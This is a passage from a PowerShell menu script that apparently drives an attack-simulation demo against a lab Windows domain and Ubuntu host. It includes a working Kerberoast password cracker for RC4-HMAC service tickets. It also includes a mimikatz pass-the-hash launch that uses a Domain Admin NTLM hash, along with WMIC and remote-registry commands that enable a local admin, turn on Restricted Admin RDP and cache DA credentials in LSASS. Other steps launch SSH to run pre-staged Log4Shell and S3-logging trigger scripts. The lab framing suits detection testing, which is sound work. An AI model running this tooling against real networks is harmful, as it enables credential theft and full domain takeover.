                                $edata2Hex = $Matches[2]
                            } else {
                                Write-Host "  [!] Could not parse TGS hash format." -ForegroundColor Red
                                break
                            }

                            # Hex to bytes helper
                            function Convert-HexToBytes([string]$hex) {
                                $bytes = New-Object byte[] ($hex.Length / 2)
                                for ($i = 0; $i -lt $hex.Length; $i += 2) {
                                    $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
                                }
                                return ,$bytes
                            }

                            # RC4 cipher
                            function Invoke-RC4([byte[]]$key, [byte[]]$data) {
                                $S = New-Object int[] 256
                                for ($i = 0; $i -lt 256; $i++) { $S[$i] = $i }
                                $j = 0
                                for ($i = 0; $i -lt 256; $i++) {
                                    $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
                                    $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp
                                }
                                $i = 0; $j = 0
                                $result = New-Object byte[] $data.Length
                                for ($k = 0; $k -lt $data.Length; $k++) {
                                    $i = ($i + 1) % 256
                                    $j = ($j + $S[$i]) % 256
                                    $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp
                                    $result[$k] = $data[$k] -bxor $S[($S[$i] + $S[$j]) % 256]
                                }
                                return ,$result
                            }

                            $checksumBytes = Convert-HexToBytes $checksumHex
                            $edata2Bytes = Convert-HexToBytes $edata2Hex

                            # Ensure MD4 type is loaded (from Step 4)
                            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class CryptoMD4TGS {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptDestroyHash(IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
    public static byte[] ComputeMD4Bytes(byte[] data) {
        IntPtr hProv = IntPtr.Zero; IntPtr hHash = IntPtr.Zero;
        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
        CryptHashData(hHash, data, (uint)data.Length, 0);
        byte[] hash = new byte[16]; uint len = 16;
        CryptGetHashParam(hHash, 2, hash, ref len, 0);
        CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
        return hash;
    }
}
"@ -ErrorAction SilentlyContinue

                            $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
                            Write-Host "  [*] Cracking TGS (etype 23 / RC4-HMAC) with $($wordlist.Count) passwords..." -ForegroundColor White
                            $startTime = Get-Date
                            $crackedTGS = $null
                            $attempts = 0
                            $msgType = [byte[]](2,0,0,0)

                            foreach ($pw in $wordlist) {
                                $attempts++
                                try {
                                    # 1. NTLM hash = MD4(UTF-16LE(password))
                                    $pwBytes = [System.Text.Encoding]::Unicode.GetBytes($pw)
                                    $ntlm = [CryptoMD4TGS]::ComputeMD4Bytes($pwBytes)

                                    # 2. K1 = HMAC-MD5(NTLM, msg_type=2)
                                    $hmac1 = New-Object System.Security.Cryptography.HMACMD5
                                    $hmac1.Key = $ntlm
                                    $K1 = $hmac1.ComputeHash($msgType)

                                    # 3. K3 = HMAC-MD5(K1, checksum)
                                    $hmac3 = New-Object System.Security.Cryptography.HMACMD5
                                    $hmac3.Key = $K1
                                    $K3 = $hmac3.ComputeHash($checksumBytes)

                                    # 4. RC4 decrypt edata2
                                    $decrypted = Invoke-RC4 -key $K3 -data $edata2Bytes

                                    # 5. Verify: HMAC-MD5(K1, decrypted[16:]) should equal decrypted[0:16]
                                    $hmacV = New-Object System.Security.Cryptography.HMACMD5
                                    $hmacV.Key = $K1
                                    $plaintext = $decrypted[16..($decrypted.Length - 1)]
                                    $expected = $hmacV.ComputeHash($plaintext)

                                    $match = $true
                                    for ($i = 0; $i -lt 16; $i++) {
                                        if ($decrypted[$i] -ne $expected[$i]) { $match = $false; break }
                                    }

                                    if ($match) {
                                        $crackedTGS = $pw
                                        break
                                    }
                                } catch { }
                                if ($attempts % 10 -eq 0) { Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray }
                            }

                            $elapsed = ((Get-Date) - $startTime).TotalSeconds
                            if ($crackedTGS) {
                                Write-Host "  [+] CRACKED! Service account password: $crackedTGS" -ForegroundColor Green
                                Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
                                $crackedTGS | Out-File -FilePath "$idpDir\kerberoast_cracked.txt" -Encoding ASCII
                                Write-Host "  [+] Saved to $idpDir\kerberoast_cracked.txt" -ForegroundColor Green
                            } else {
                                Write-Host "  [-] Exhausted wordlist ($attempts passwords) in $([math]::Round($elapsed,2))s." -ForegroundColor Yellow
                                Write-Host "  [*] Password not in wordlist. Try a larger dictionary." -ForegroundColor White
                            }
                        }
                    }
                } elseif ($kerbOutput -match "\[NO_RESULTS\]") {
                    Write-Host "  [!] No SPN accounts found in the domain." -ForegroundColor Red
                    Write-Host
                    Write-Host "  Pre-requisite: register an SPN for a service account on the DC:" -ForegroundColor Yellow
                    Write-Host "    setspn -A MSSQLSvc/warp-duck-DT.$($env:ENV_DOMAIN):1433 svc_runbook" -ForegroundColor Gray
                } else {
                    Write-Host "  [!] Kerberoast may have failed. Check output above." -ForegroundColor Red
                }
            } else {
                Write-Host "  [!] No output after ${maxWait}s. PowerShell may have been blocked on DT." -ForegroundColor Red
                Write-Host "  [*] Check if Defender blocked the script on DT." -ForegroundColor Yellow
            }

            # Cleanup
            schtasks /delete /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /f 2>$null | Out-Null
            Remove-Item "$dtIdpRemote\run_kerberoast.ps1" -Force -ErrorAction SilentlyContinue
            net use $dtShare /delete /y 2>$null | Out-Null
            Write-Host
        }

        # ================================================================
        # STEP 7: LATERAL MOVEMENT TO UBUNTU (Active)
        # ================================================================
        '7' {
            Show-StepBanner -Step "7" -Title "LATERAL MOVEMENT TO UBUNTU - CLOUD DETECTIONS" -Lines @(
                "The attacker moves from the Windows domain to the"
                "Ubuntu server at $($env:ENV_UBUNTU)."
                ""
                "Pre-staged scripts trigger cloud security detections:"
                ""
                "  1. Log4Shell behavioral detection (JNDI injection)"
                "     /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh"
                ""
                "  2. S3 bucket logging disabled"
                "     /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh"
                ""
                "  S3 bucket: warp-duck-private-bucket-d14afc48"
            ) -Detection "CrowdStrike: Log4Shell IoA, S3 bucket logging change"

            Write-Host "  --- SSH Connection ---" -ForegroundColor Yellow
            Write-Host
            Write-Host "  Run:" -ForegroundColor Cyan
            Write-Host "    ssh ubuntu@$env:ENV_UBUNTU" -ForegroundColor Green
            Write-Host
            Write-Host "  Then execute:" -ForegroundColor Cyan
            Write-Host "    /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh" -ForegroundColor Green
            Write-Host "    /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh" -ForegroundColor Green
            Write-Host

            $launchSSH = Read-Host "  Launch SSH now? (y/N)"
            if ($launchSSH -eq 'y') {
                $sshUser = Read-Host "  SSH username (default: ubuntu)"
                if (-not $sshUser) { $sshUser = "ubuntu" }
                try {
                    Start-Process -FilePath "ssh" -ArgumentList "$sshUser@$env:ENV_UBUNTU"
                    Write-Host "  [+] SSH launched." -ForegroundColor Green
                } catch {
                    Write-Host "  [!] SSH not available. Connect manually." -ForegroundColor Red
                }
            }
        }

        # ================================================================
        # C: CONFIGURE IPs
        # ================================================================
        {$_ -eq 'C' -or $_ -eq 'c'} {
            Clear-Host
            Write-Host "`n--- Current Configuration ---" -ForegroundColor Cyan
            Write-Host "  ENV_DOMAIN   = $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "  ENV_DC_IP    = $env:ENV_DC_IP" -ForegroundColor White
            Write-Host "  ENV_DT       = $env:ENV_DT" -ForegroundColor White
            Write-Host "  ENV_FORTI_IP = $env:ENV_FORTI_IP" -ForegroundColor White
            Write-Host "  ENV_UBUNTU   = $env:ENV_UBUNTU" -ForegroundColor White
            Write-Host

            $editVar = Read-Host "  Variable to change (or Enter to go back)"
            if ($editVar -and $editVar -match '^ENV_') {
                $newVal = Read-Host "  New value for $editVar"
                if ($newVal) {
                    Set-Item -Path "env:$editVar" -Value $newVal
                    Write-Host "  [+] $editVar = $newVal" -ForegroundColor Green
                    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN", "ENV_FORTI_IP=$env:ENV_FORTI_IP") | Out-File -FilePath $ipConfigFile -Encoding ASCII
                    Write-Host "  [+] Saved." -ForegroundColor Green
                }
            }
        }

        # ================================================================
        # P: PREP LAB (Enable demo on DT + cache DA creds)
        # ================================================================
        {$_ -eq 'P' -or $_ -eq 'p'} {
            Clear-Host
            Write-Host
            Write-Host "  ================================================================" -ForegroundColor Magenta
            Write-Host "  LAB PREPARATION - Using clark.monroe DA hash" -ForegroundColor Magenta
            Write-Host "  ================================================================" -ForegroundColor Magenta
            Write-Host
            Write-Host "  This step uses clark.monroe Domain Admin hash to:" -ForegroundColor White
            Write-Host "    1. Re-enable the demo local admin account on DT" -ForegroundColor White
            Write-Host "    2. Enable Restricted Admin RDP on DT (for PtH RDP)" -ForegroundColor White
            Write-Host "    3. Cache clark.monroe credentials on DT via brief RDP" -ForegroundColor White
            Write-Host "       (so Step 5 dump finds DA hash - better demo story)" -ForegroundColor White
            Write-Host

            # --- Get clark.monroe hash ---
            $clarkHash = Get-ClarkHash
            if (-not $clarkHash) {
                Write-Host "  [!] clark.monroe hash not found." -ForegroundColor Red
                Write-Host "  [*] Run Step 3 first (dump on unmanaged) or enter it manually:" -ForegroundColor Yellow
                $manualClark = Read-Host "  clark.monroe NTLM hash (32 hex)"
                if ($manualClark -and $manualClark.Length -eq 32) {
                    $manualClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
                    $clarkHash = $manualClark
                } else {
                    Write-Host "  [!] Invalid hash. Aborting." -ForegroundColor Red
                    break
                }
            }
            Write-Host "  [+] clark.monroe hash: $clarkHash" -ForegroundColor Green
            Write-Host

            # --- Step P1: Write prep batch file ---
            Write-Host "  --- P1: Creating prep script ---" -ForegroundColor Yellow
            $prepBat = "$idpDir\prep_dt_remote.bat"
            $prepCommands = @(
                '@echo off'
                'echo [*] Prep: Enabling demo account on DT...'
                "wmic /node:$env:ENV_DT process call create `"cmd.exe /c net user demo /active:yes`""
                'echo [*] Waiting for command to execute...'
                'timeout /t 3 /nobreak >nul'
                'echo [*] Prep: Enabling Restricted Admin RDP on DT...'
                "reg add `"\\$env:ENV_DT\HKLM\System\CurrentControlSet\Control\Lsa`" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
                'echo [*] Waiting...'
                'timeout /t 2 /nobreak >nul'
                'echo [*] Prep: Launching Restricted Admin RDP to cache DA creds...'
                'echo [*] A brief RDP window will open. Just close it after login.'
                "mstsc /v:$env:ENV_DT /restrictedadmin"
                'echo.'
                'echo [+] Lab prep complete.'
                'echo [+] demo account should be active on DT.'
                'echo [+] clark.monroe creds should be cached in LSASS on DT.'
                'pause'
            ) -join "`r`n"
            $prepCommands | Out-File -FilePath $prepBat -Encoding ASCII
            Write-Host "  [+] Prep script written to $prepBat" -ForegroundColor Green
            Write-Host

            # --- Step P2: Launch PtH as clark.monroe ---
            Write-Host "  --- P2: Pass-the-Hash as clark.monroe ---" -ForegroundColor Yellow
            Write-Host "  [*] Launching mimikatz PtH -> prep script..." -ForegroundColor White
            Write-Host "  [*] A new cmd window will open as clark.monroe (DA)." -ForegroundColor White
            Write-Host "  [*] That window will:" -ForegroundColor White
            Write-Host "        - Enable demo account on DT via WMIC" -ForegroundColor Gray
            Write-Host "        - Enable restricted admin RDP on DT" -ForegroundColor Gray
            Write-Host "        - Open RDP to cache clark.monroe creds on DT" -ForegroundColor Gray
            Write-Host

            $doPtH = Read-Host "  Launch PtH prep? (Y/n)"
            if ($doPtH -ne 'n') {
                try {
                    Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$prepBat`" `"exit`""
                    Write-Host
                    Write-Host "  [+] PtH launched in new window." -ForegroundColor Green
                    Write-Host "  [*] Follow the prompts in that window." -ForegroundColor Cyan
                    Write-Host "  [*] When RDP opens, just log in briefly then close." -ForegroundColor Cyan
                    Write-Host "  [*] After that, clark.monroe creds will be cached on DT." -ForegroundColor Cyan
                } catch {
                    Write-Host "  [!] Error launching PtH: $_" -ForegroundColor Red
                }
            }
            Write-Host
        }

        'q' { return }
    }
    pause
}
until ($selection -eq 'q')
